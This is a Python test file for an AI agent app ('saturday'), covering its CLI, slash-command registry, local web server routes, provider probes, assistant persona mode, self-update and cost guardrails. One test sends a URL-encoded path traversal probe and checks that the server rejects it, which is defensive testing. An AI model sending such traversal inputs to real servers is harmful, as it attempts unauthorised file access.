def test_init_mentions_chat_and_doctor(capsys, tmp_path, monkeypatch):
    from saturday.cli import cmd_init

    monkeypatch.chdir(tmp_path)
    cmd_init(Namespace(force=False))
    captured = capsys.readouterr().out
    assert "doctor" in captured and "app" in captured and "run" in captured



# ---- merged from test_slash_registry.py ----
@pytest.fixture(autouse=True)
def _hermetic(monkeypatch):
    import saturday.config as cfgmod
    import saturday.mcp_plugin as mcpmod

    monkeypatch.setattr(mcpmod, "load_mcp_config", lambda *a, **k: {})
    monkeypatch.setattr(cfgmod, "save_config", lambda partial: None)


def test_registry_help_and_menu_are_lockstep():
    """HELP_TEXT, the /api/state menu and the registry dispatch exactly the
    same command set — a command added to one surface without the others is
    the drift this extraction exists to prevent."""
    import saturday.slash as slash
    from saturday.repl import HELP_TEXT

    help_cmds = set(re.findall(r"^  (/\w+)", HELP_TEXT, re.M))
    menu_cmds = {name for name, _ in slash.SLASH_COMMAND_LIST}
    registry_cmds = set(slash.COMMANDS)

    assert help_cmds == menu_cmds == registry_cmds, {
        "help_only": sorted(help_cmds - registry_cmds),
        "menu_only": sorted(menu_cmds - registry_cmds),
        "registry_only": sorted(registry_cmds - help_cmds),
    }
    # descriptions on the registry entries are the served menu verbatim
    for sc in slash.COMMANDS.values():
        assert [sc.name, sc.desc] in slash.SLASH_COMMAND_LIST


def test_webui_reexports_shared_registry_objects():
    """webui must re-export the shared objects (identity, not copies) so
    embedders and tests observe registry edits immediately."""
    import saturday.slash as slash
    import saturday.webui as webui

    assert webui.SLASH_COMMAND_LIST is slash.SLASH_COMMAND_LIST
    assert webui.SLASH_ALIASES is slash.SLASH_ALIASES


class _Server:
    def __init__(self, app: AppState):
        self.app = app
        self.http = AppServer(("127.0.0.1", 0), app, token=TOKEN)
        self.base = f"http://127.0.0.1:{self.http.server_address[1]}"
        self.thread = threading.Thread(target=self.http.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *a):
        self.http.shutdown()
        self.http.server_close()


def _make_app(tmp_path: Path) -> AppState:
    app = AppState(
        store_root=tmp_path / "sessions",
        cfg_overrides={"safety_mode": "off", "workspace_root": str(tmp_path)},
    )
    fake = make_scripted_model([{"content": "ok"}])
    orig_new = app._new_agent

    def patched(cfg):
        agent = orig_new(cfg)
        agent._ensure_client = lambda: fake
        return agent

    app._new_agent = patched
    return app


def _req(base: str, path: str, method: str, payload: dict | None = None):
    data = json.dumps(payload or {}).encode() if method in ("POST", "PATCH") else None
    r = urllib.request.Request(f"{base}{path}", data=data, method=method)
    # r2 review: the URL query is no longer an auth channel — use the header
    r.add_header("X-Saturday-Token", TOKEN)
    if data is not None:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read().decode())


def test_unknown_routes_404_across_verbs(tmp_path):
    """Route tables must fall through to the same 404 JSON for unmatched
    paths on every verb (parameterized families too, e.g. /api/session/...
    with a bogus suffix shape is simply not matched)."""
    app = _make_app(tmp_path)
    with _Server(app) as srv:
        for method in ("GET", "POST", "PATCH", "DELETE"):
            status, body = _req(srv.base, "/api/definitely-not-a-route", method)
            assert status == 404, (method, status)
            assert body == {"error": "not found"}, (method, body)
        # unparseable parameterized family member falls through as well
        status, body = _req(srv.base, "/api/session/%2e%2e/escape", "GET")
        assert status == 404



# ---- merged from test_onboarding.py ----
class _Resp:
    def __init__(self, data: bytes) -> None:
        self._data = data

    def read(self, _n: int | None = None) -> bytes:
        return self._data

    def __enter__(self):
        return self

    def __exit__(self, *a) -> bool:
        return False


def _capture_urlopen(monkeypatch, err: Exception | None = None, data: bytes = b""):
    seen = {}

    def _open(req, timeout):  # noqa: ARG001
        if err is not None:
            raise err
        seen["req"] = req
        return _Resp(data)

    monkeypatch.setattr(urllib.request, "urlopen", _open, raising=True)
    return seen


def _models_payload(*ids: str) -> bytes:
    return json.dumps({"data": [{"id": i} for i in ids]}).encode()


def test_probe_ok_lists_models_deduplicated(monkeypatch):
    data = _models_payload("deepseek-r1", "deepseek-v3", "deepseek-r1")
    seen = _capture_urlopen(monkeypatch, data=data)
    ok, detail, models = pr.probe_connection(PROVIDERS["deepseek"], "k123")
    assert ok is True
    assert models == ["deepseek-r1", "deepseek-v3"]
    assert "2 models" in detail
    seen["req"].full_url.endswith("/models")
    assert seen["req"].headers["Authorization"] == "Bearer k123"


def test_probe_auth_rejected(monkeypatch):
    _capture_urlopen(monkeypatch, err=urllib.error.HTTPError("http://x", 401, "Unauthorized", {}, None))
    ok, detail, models = pr.probe_connection(PROVIDERS["deepseek"], "bad")
    assert ok is False
    assert "auth rejected" in detail
    assert models == []


def test_probe_unreachable(monkeypatch):
    _capture_urlopen(monkeypatch, err=urllib.error.URLError(OSError("boom")))
    ok, detail, _ = pr.probe_connection(PROVIDERS["deepseek"], "k123")
    assert ok is False
    assert "unreachable" in detail


def test_probe_garbage_ok_but_no_models(monkeypatch):
    _capture_urlopen(monkeypatch, data=b"<html>not json</html>")
    ok, _, models = pr.probe_connection(PROVIDERS["deepseek"], "k")
    assert ok is True
    assert models == []


def test_probe_azure_uses_api_key_header(monkeypatch):
    monkeypatch.setenv("AZURE_OPENAI_BASE_URL", "http://azure.test/v1")
    seen = _capture_urlopen(monkeypatch, data=b"{}")
    ok, _, _ = pr.probe_connection(PROVIDERS["azure-openai"], "k9")
    assert ok is True
    # urllib capitalizes header keys: "api-key" -> "Api-key"
    assert seen["req"].headers.get("Api-key") == "k9"
    assert "Authorization" not in seen["req"].headers


def test_probe_anthropic_bearer_via_openai_compat(monkeypatch):
    """Anthropic's OpenAI-compatible layer takes the key as Bearer (docs);
    the native x-api-key/anthropic-version headers are for /v1/messages."""
    seen = _capture_urlopen(monkeypatch, data=b"{}")
    ok, _, _ = pr.probe_connection(PROVIDERS["anthropic"], "k9")
    assert ok is True
    assert seen["req"].headers.get("Authorization") == "Bearer k9"
    assert "X-api-key" not in seen["req"].headers
    assert "Anthropic-version" not in seen["req"].headers


def test_configured_or_hint_gates_missing_key(monkeypatch, tmp_path):
    import argparse

    from saturday import cli

    monkeypatch.setattr("saturday.config.CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.setattr("saturday.cli._print", lambda *a, **k: None)
    monkeypatch.delenv("DEEPSEEK_API_KEY", raising=False)

    ns = argparse.Namespace(env=None)
    assert cli._configured_or_hint(ns) == 1

    monkeypatch.setenv("DEEPSEEK_API_KEY", "x")
    assert cli._configured_or_hint(ns) is None



# ---- merged from test_assistant_mode.py ----
@pytest.fixture(autouse=True)
def _hermetic_user_config(monkeypatch, tmp_path):
    import os

    from saturday import config as cfgmod
    import saturday.mcp_plugin as mcpmod

    monkeypatch.setattr(cfgmod, "CONFIG_FILE", tmp_path / "config.json")
    monkeypatch.setattr(mcpmod, "load_mcp_config", lambda *a, **k: {})
    for k in [k for k in os.environ if k.startswith("SATURDAY_")]:
        monkeypatch.delenv(k)


def _agent(**kw) -> Agent:
    cfg = AgentConfig(provider="openai", model="m", workspace_root=str(Path.cwd()), **kw)
    return Agent(cfg=cfg, safety=False)


def _names(agent: Agent) -> set:
    return set(agent._build_registry().names())


def test_registry_identical_across_modes():
    """Assistant mode HIDES plumbing in UX, never removes capability."""
    agent_names = _names(_agent())
    assistant_names = _names(_agent(persona_mode="assistant"))
    assert agent_names == assistant_names
    # the world-acting tools must all be present in assistant mode
    for must in ("shell", "python", "pointer", "keyboard", "ui_invoke", "app_open",
                 "screen", "web_search", "browser", "write_file", "memory", "todo"):
        assert must in assistant_names, must


def test_assistant_prompt_outcome_focused_and_non_intrusive():
    reg = _agent()._build_registry()
    assistant = build_system_prompt(reg, persona_mode="assistant", workspace_root=".")
    default = build_system_prompt(reg, persona_mode="agent", workspace_root=".")
    assert "hands-free operator" in assistant
    assert "NON-INTRUSIVE" in assistant and "window=<title>" in assistant
    assert "never describe commands" in assistant.lower() or "report outcomes" in assistant.lower()
    assert "personal assistant mode" not in default
    # light planning only: the heavy dev reasoning protocol stays out
    assert "Reasoning protocol" not in assistant
    assert "background-first" in assistant


def test_default_agent_prompt_unchanged():
    reg = _agent()._build_registry()
    default = build_system_prompt(reg, workspace_root=".")
    assert "state-of-the-art autonomous software engineering" in default
    assert "Reasoning protocol" in default


class _Server2:
    def __init__(self, app):
        from saturday.webui import AppServer

        self.http = AppServer(("127.0.0.1", 0), app, token=TOKEN)
        self.base = f"http://127.0.0.1:{self.http.server_address[1]}"
        self.thread = threading.Thread(target=self.http.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *a):
        self.http.shutdown()
        self.http.server_close()


def _make_app2(tmp_path, turns=None):
    from fakes import make_scripted_model
    from saturday.projects import ProjectStore
    from saturday.webui import AppState

    app = AppState(
        store_root=tmp_path / "sessions",
        projects_store=ProjectStore(tmp_path / "projects.json"),
        cfg_overrides={"safety_mode": "off", "workspace_root": str(tmp_path / "ws")},
    )
    fake = make_scripted_model(turns or [{"content": "ok"}])
    orig = app._new_agent

    def patched(cfg):
        agent = orig(cfg)
        agent._ensure_client = lambda: fake
        return agent

    app._new_agent = patched
    return app


def _req2(base, path, method="GET", payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    r = urllib.request.Request(base + path, data=data, method=method)
    r.add_header("X-Saturday-Token", TOKEN)
    if data:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {}


def test_enabling_assistant_defaults_background_first(tmp_path: Path):
    app = _make_app2(tmp_path)
    with _Server2(app) as srv:
        status, data = _req2(srv.base, "/api/config", "POST", {"persona_mode": "assistant"})
        assert status == 200
        assert data["persona_mode"] == "assistant"
        assert data["background_only"] is True, "assistant works while you work"

    # explicit override wins over the default
    app2 = _make_app2(tmp_path / "b")
    with _Server(app2) as srv:
        status, data = _req2(srv.base, "/api/config", "POST",
                            {"persona_mode": "assistant", "desktop_background_only": False})
        assert status == 200 and data["persona_mode"] == "assistant" and data["background_only"] is False

    # switching back to agent leaves the bg flag where the user put it
    with _Server(app2) as srv:
        status, data = _req2(srv.base, "/api/config", "POST", {"persona_mode": "agent"})
        assert status == 200 and data["persona_mode"] == "agent" and data["background_only"] is False


def test_persona_toggle_keeps_tools_and_updates_prompt_live(tmp_path: Path):
    app = _make_app2(tmp_path)
    sid = app.store.create({"task": "am", "surface": "app"})
    rt = app.runtime_for(sid)
    before = _names(rt.agent)
    with _Server2(app) as srv:
        status, data = _req2(srv.base, "/api/config", "POST", {"persona_mode": "assistant"})
        assert status == 200
    assert _names(rt.agent) == before, "no capability may disappear in assistant mode"
    sysp = rt.agent.system_prompt(rt.agent.registry)
    assert "hands-free operator" in sysp
    with _Server2(app) as srv:
        _req2(srv.base, "/api/config", "POST", {"persona_mode": "agent"})
    assert "hands-free operator" not in rt.agent.system_prompt(rt.agent.registry)


def test_invalid_persona_mode_ignored(tmp_path: Path):
    app = _make_app2(tmp_path)
    with _Server2(app) as srv:
        status, data = _req2(srv.base, "/api/config", "POST", {"persona_mode": "bogus"})
        assert status == 200 and data["persona_mode"] == "agent"


def test_cli_assistant_flag_sets_override():
    from saturday.cli import _overrides

    args = argparse.Namespace(provider=None, model=None, temperature=None, max_steps=None, assistant=True)
    assert _overrides(args)["persona_mode"] == "assistant"
    args2 = argparse.Namespace(provider=None, model=None, temperature=None, max_steps=None, assistant=False)
    assert _overrides(args2)["persona_mode"] is None


# ------------------------------------------------------------- identity layer

def test_identity_injected_into_prompt():
    reg = _agent()._build_registry()
    plain = build_system_prompt(reg, persona_mode="assistant", workspace_root=".")
    assert 'go by "Jarvis"' not in plain
    named = build_system_prompt(
        reg, persona_mode="assistant", workspace_root=".",
        assistant_name="Jarvis", assistant_user_title="sir",
    )
    assert 'go by "Jarvis"' in named
    assert 'Address the user as "sir"' in named
    assert "mission debrief" in named
    # agent mode must stay clean of the identity block
    assert "Identity & voice" not in build_system_prompt(reg, persona_mode="agent", workspace_root=".")


def test_identity_config_roundtrip_validation_and_clone_sync(tmp_path: Path):
    app = _make_app2(tmp_path)
    sid = app.store.create({"task": "ident", "surface": "app"})
    rt = app.runtime_for(sid)  # project-less runtime shares base cfg object
    with _Server2(app) as srv:
        status, data = _req2(srv.base, "/api/config", "POST", {"persona_mode": "assistant"})
        assert status == 200
        status, data = _req2(srv.base, "/api/config", "POST",
                            {"assistant_name": "Jarvis", "assistant_user_title": "sir"})
        assert status == 200
        assert data["assistant_name"] == "Jarvis" and data["assistant_user_title"] == "sir"
        assert rt.agent.cfg.assistant_name == "Jarvis"

        status, data = _req2(srv.base, "/api/config", "POST", {"assistant_name": "x" * 41})
        assert status == 400
        status, data = _req2(srv.base, "/api/config", "POST", {"assistant_name": "two\nlines"})
        assert status == 400

        status, data = _req2(srv.base, "/api/config", "POST", {"assistant_name": ""})
        assert status == 200 and data["assistant_name"] == "", "empty clears the name"

    sysp = rt.agent.system_prompt(rt.agent.registry)
    assert 'go by "Jarvis"' not in sysp or rt.agent.cfg.assistant_name == "Jarvis"


def test_project_clone_receives_identity(tmp_path: Path):
    from saturday.projects import ProjectStore
    from saturday.webui import AppState

    app = AppState(
        store_root=tmp_path / "sessions2",
        projects_store=ProjectStore(tmp_path / "p2.json"),
        cfg_overrides={"safety_mode": "off", "workspace_root": str(tmp_path / "ws")},
    )
    app.base_cfg.assistant_name = "Friday"
    app.base_cfg.persona_mode = "assistant"
    sid = app.store.create({"task": "clone-id", "surface": "app"})
    proj_ws = tmp_path / "pws"
    proj_ws.mkdir()
    _, d = None, None

    with _Server2(app) as srv:
        _, d = _req2(srv.base, "/api/projects", "POST", {"name": "P", "workspace": str(proj_ws)})
        pid = d["project"]["id"]
        payload = {"text": "hello", "project_id": pid}
        r = urllib.request.Request(srv.base + "/api/chat", data=json.dumps(payload).encode(), method="POST")
        r.add_header("X-Saturday-Token", TOKEN)
        r.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(r, timeout=120) as resp:
            resp.read()
    proj_rt = next(rt for rt in app.runtimes.values() if rt.project_id == pid)
    rcfg = proj_rt.agent.cfg
    assert rcfg is not app.base_cfg, "project runtime holds a clone"
    assert rcfg.assistant_name == "Friday"


# ---- self-update system --------------------------------------------------


def test_version_parse_and_compare():
    from saturday.update import _parse_version, is_newer

    assert _parse_version("v1.2.3") == (1, 2, 3)
    assert _parse_version("0.9.0") == (0, 9, 0)
    assert is_newer("0.9.1", "0.9.0")
    assert is_newer("1.0.0", "0.9.9")
    assert not is_newer("0.9.0", "0.9.0")
    assert not is_newer("0.8.9", "0.9.0")


def test_latest_release_parses_real_shaped_response(monkeypatch):
    from saturday import update as upd

    class FakeResp:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self, _n):
            return json.dumps(
                {"tag_name": "v0.9.1", "html_url": "https://x/releases/v0.9.1", "assets": [{"name": "a.deb"}, {"name": "b.rpm"}]}
            ).encode()

    monkeypatch.setattr("urllib.request.urlopen", lambda *a, **k: FakeResp())
    rel = upd.latest_release()
    assert rel == {"tag": "v0.9.1", "url": "https://x/releases/v0.9.1", "assets": ["a.deb", "b.rpm"]}


def test_latest_release_never_raises_on_network_failure(monkeypatch):
    from saturday import update as upd

    def boom(*a, **k):
        raise OSError("network unreachable")

    monkeypatch.setattr("urllib.request.urlopen", boom)
    assert upd.latest_release() is None


def test_detect_channel_pip_and_pipx(monkeypatch):
    from saturday import update as upd

    monkeypatch.setattr(sys, "frozen", False, raising=False)
    monkeypatch.delenv("PIPX_HOME", raising=False)
    monkeypatch.setattr(upd.sys, "executable", "/usr/bin/python3")
    assert upd.detect_channel() == "pip"

    monkeypatch.setenv("PIPX_HOME", "/home/x/.local/pipx")
    assert upd.detect_channel() == "pipx"


def test_detect_channel_frozen_platforms(monkeypatch):
    from saturday import update as upd

    monkeypatch.setattr(upd.sys, "frozen", True, raising=False)
    monkeypatch.setattr(upd.sys, "platform", "darwin")
    assert upd.detect_channel() == "macos-dmg"

    monkeypatch.setattr(upd.sys, "platform", "win32")
    assert upd.detect_channel() == "windows-installer"

    monkeypatch.setattr(upd.sys, "platform", "linux")
    monkeypatch.setenv("APPIMAGE", "/tmp/Saturday.AppImage")
    assert upd.detect_channel() == "appimage"

    monkeypatch.delenv("APPIMAGE", raising=False)
    monkeypatch.setattr(upd.shutil, "which", lambda name: "/usr/bin/dpkg" if name == "dpkg" else None)
    monkeypatch.setattr(upd, "_pkg_query", lambda cmd: cmd[0] == "dpkg")
    assert upd.detect_channel() == "deb"

    monkeypatch.setattr(upd.shutil, "which", lambda name: None)
    assert upd.detect_channel() == "linux-bundle-unknown"


def test_update_lock_rejects_concurrent_and_reclaims_dead(tmp_path, monkeypatch):
    from saturday import update as upd
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_DIR", tmp_path / "home")

    with upd.update_lock():
        with pytest.raises(upd.UpdateInProgress):
            with upd.update_lock():
                pass
    # lock released cleanly after the first `with` exits
    with upd.update_lock():
        pass

    # a lock left by a dead pid must not block forever
    lock = upd._lock_path()
    lock.parent.mkdir(parents=True, exist_ok=True)
    proc = subprocess.Popen([sys.executable, "-c", "pass"])
    proc.wait()
    lock.write_text(json.dumps({"pid": proc.pid, "started": time.time()}))
    with upd.update_lock():
        pass


def test_record_receipt_writes_jsonl(tmp_path, monkeypatch):
    from saturday import update as upd
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_DIR", tmp_path / "home")
    upd.record_receipt(from_version="0.9.0", to_version="0.9.1", channel="pip", ok=True, detail="updated")
    path = tmp_path / "home" / "update-log.jsonl"
    entry = json.loads(path.read_text().splitlines()[0])
    assert entry["from"] == "0.9.0" and entry["to"] == "0.9.1" and entry["ok"] is True


def test_perform_update_pip_success_and_failure(monkeypatch):
    from saturday import update as upd

    class Ok:
        returncode = 0
        stdout = ""
        stderr = ""

    monkeypatch.setattr(upd.subprocess, "run", lambda *a, **k: Ok())
    ok, detail = upd.perform_update("pip")
    assert ok and detail == "updated"

    class Fail:
        returncode = 1
        stdout = ""
        stderr = "boom"

    monkeypatch.setattr(upd.subprocess, "run", lambda *a, **k: Fail())
    ok, detail = upd.perform_update("pip")
    assert not ok and "boom" in detail


def test_perform_update_manual_channel_returns_hint_not_action():
    from saturday import update as upd

    ok, detail = upd.perform_update("deb")
    assert not ok
    assert "apt-get" in detail


def test_cmd_update_reports_up_to_date(monkeypatch, capsys):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.update.current_version", lambda: "0.9.1")
    monkeypatch.setattr("saturday.update.latest_release", lambda: {"tag": "v0.9.1", "url": "", "assets": []})
    args = Namespace(apply=False)
    assert cli.cmd_update(args) == 0
    assert "up to date" in capsys.readouterr().out


def test_cmd_update_check_only_prints_manual_hint(monkeypatch, capsys):
    import saturday.cli as cli

    monkeypatch.setattr("saturday.update.current_version", lambda: "0.9.0")
    monkeypatch.setattr("saturday.update.latest_release", lambda: {"tag": "v0.9.1", "url": "", "assets": []})
    monkeypatch.setattr("saturday.update.detect_channel", lambda: "pip")
    args = Namespace(apply=False)
    assert cli.cmd_update(args) == 0
    out = capsys.readouterr().out
    assert "update available: 0.9.0 -> v0.9.1" in out
    assert "--apply" in out


def test_cmd_update_apply_success_relaunches(monkeypatch, capsys, tmp_path):
    import saturday.cli as cli
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_DIR", tmp_path / "home")
    monkeypatch.setattr("saturday.update.current_version", lambda: "0.9.0")
    monkeypatch.setattr("saturday.update.latest_release", lambda: {"tag": "v0.9.1", "url": "", "assets": []})
    monkeypatch.setattr("saturday.update.detect_channel", lambda: "pip")
    monkeypatch.setattr("saturday.update.perform_update", lambda channel: (True, "updated"))
    relaunched = []
    monkeypatch.setattr("saturday.update.relaunch", lambda: relaunched.append(True))

    args = Namespace(apply=True, relaunch=True)
    assert cli.cmd_update(args) == 0
    assert relaunched == [True]
    log = (tmp_path / "home" / "update-log.jsonl").read_text()
    assert '"ok": true' in log


def test_cmd_update_apply_failure_no_relaunch(monkeypatch, capsys, tmp_path):
    import saturday.cli as cli
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_DIR", tmp_path / "home")
    monkeypatch.setattr("saturday.update.current_version", lambda: "0.9.0")
    monkeypatch.setattr("saturday.update.latest_release", lambda: {"tag": "v0.9.1", "url": "", "assets": []})
    monkeypatch.setattr("saturday.update.detect_channel", lambda: "deb")
    monkeypatch.setattr("saturday.update.perform_update", lambda channel: (False, "manual only"))
    relaunched = []
    monkeypatch.setattr("saturday.update.relaunch", lambda: relaunched.append(True))

    args = Namespace(apply=True, relaunch=True)
    assert cli.cmd_update(args) == 1
    assert relaunched == []
    assert "update failed" in capsys.readouterr().out


def test_cmd_update_respects_held_lock(monkeypatch, capsys, tmp_path):
    import saturday.cli as cli
    import saturday.config as cfgmod
    from saturday import update as upd

    monkeypatch.setattr(cfgmod, "CONFIG_DIR", tmp_path / "home")
    monkeypatch.setattr("saturday.update.current_version", lambda: "0.9.0")
    monkeypatch.setattr("saturday.update.latest_release", lambda: {"tag": "v0.9.1", "url": "", "assets": []})
    monkeypatch.setattr("saturday.update.detect_channel", lambda: "pip")

    with upd.update_lock():
        args = Namespace(apply=True, relaunch=True)
        assert cli.cmd_update(args) == 1
    assert "already running" in capsys.readouterr().out


# ---- model fallback CLI exposure -----------------------------------------
# The fallback chain itself (LLMClient.chat: per-candidate retries, error
# classification, backoff) already existed and is fully tested elsewhere;
# fallback_models just had no way to actually be set outside a hand-edited
# config.json. This only tests the new CLI plumbing.


def test_fallback_models_flag_reaches_overrides():
    from saturday.cli import _overrides

    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, fallback_models="gpt-4o,claude-3-5-sonnet",
    )
    assert _overrides(args)["fallback_models"] == "gpt-4o,claude-3-5-sonnet"


def test_fallback_models_string_splits_into_list_on_load(tmp_path, monkeypatch):
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_FILE", tmp_path / "config.json")
    cfg = AgentConfig.load({"fallback_models": "gpt-4o, claude-3-5-sonnet ,  "})
    assert cfg.fallback_models == ["gpt-4o", "claude-3-5-sonnet"]


# ---- cost budget + data-policy guardrails ---------------------------------


def test_cost_budget_stop_aborts_run_with_cost_budget_reason():
    from saturday.types import Usage

    base = make_scripted_model([{"tool_calls": [{"name": "noop", "arguments": {}}]} for _ in range(20)])
    orig_chat = base.chat

    def chat_with_usage(messages, **kwargs):
        resp = orig_chat(messages, **kwargs)
        resp.message.usage = Usage(prompt_tokens=600, completion_tokens=50, total_tokens=650)
        return resp

    base.chat = chat_with_usage

    class Noop:
        name = "noop"
        description = "n"
        parameters = {"type": "object", "properties": {}, "required": []}

        def run(self, args):
            return True, "ok"

    reg = ToolRegistry()
    reg.register(Noop())
    # deepseek-chat is real-priced in usage.py's list (0.27, 1.10) per
    # million tokens; ~$0.000217/turn. Same identical-tool-call shape as
    # test_budget_stop_aborts_run_with_budget_reason, so this needs to trip
    # by the same turn (~4) or the stall detector wins the race instead.
    loop = AgentLoop(base, reg, max_steps=20, max_run_cost_usd=0.0006, cost_provider="deepseek", cost_model="deepseek-chat")
    traj = loop.run("sys", "go")
    assert traj.stop_reason == "cost_budget"
    assert "[budget stop] cost budget $0.00" in (traj.final_answer or "")


def test_cost_budget_never_fires_for_an_unpriced_model():
    from saturday.types import Usage

    base = make_scripted_model([{"content": "done"}])
    orig_chat = base.chat

    def chat_with_usage(messages, **kwargs):
        resp = orig_chat(messages, **kwargs)
        resp.message.usage = Usage(prompt_tokens=999_999, completion_tokens=999_999, total_tokens=1_999_998)
        return resp

    base.chat = chat_with_usage
    reg = ToolRegistry()
    loop = AgentLoop(base, reg, max_steps=5, max_run_cost_usd=0.0001, cost_provider="totally-unknown", cost_model="not-in-the-table")
    traj = loop.run("sys", "go")
    assert traj.stop_reason != "cost_budget"


def test_blocked_provider_raises_before_client_is_built(tmp_path):
    cfg = AgentConfig(provider="openai", model="gpt-4o", workspace_root=str(tmp_path), blocked_providers=["openai"])
    agent = Agent(cfg=cfg)
    with pytest.raises(ValueError, match="blocked by a data-policy guardrail"):
        agent._ensure_client()


def test_blocked_model_raises_before_client_is_built(tmp_path):
    cfg = AgentConfig(provider="openai", model="gpt-4o", workspace_root=str(tmp_path), blocked_models=["gpt-4o"])
    agent = Agent(cfg=cfg)
    with pytest.raises(ValueError, match="blocked by a data-policy guardrail"):
        agent._ensure_client()


def test_blocked_models_filtered_out_of_fallback_chain(tmp_path, monkeypatch):
    import saturday.config as cfgmod

    monkeypatch.setattr(cfgmod, "CONFIG_FILE", tmp_path / "config.json")
    cfg = AgentConfig.load({"fallback_models": "gpt-4o,claude-3-5-sonnet,gpt-3.5", "blocked_models": "gpt-3.5"})
    assert cfg.fallback_models == ["gpt-4o", "claude-3-5-sonnet"]


def test_blocked_providers_and_models_flags_reach_overrides():
    from saturday.cli import _overrides

    args = Namespace(
        provider=None, model=None, temperature=None, max_steps=None,
        assistant=False, plan=False, blocked_providers="openai,xai", blocked_models="gpt-3.5",
        max_run_cost_usd=2.5,
    )
    out = _overrides(args)
    assert out["blocked_providers"] == "openai,xai"
    assert out["blocked_models"] == "gpt-3.5"
    assert out["max_run_cost_usd"] == 2.5

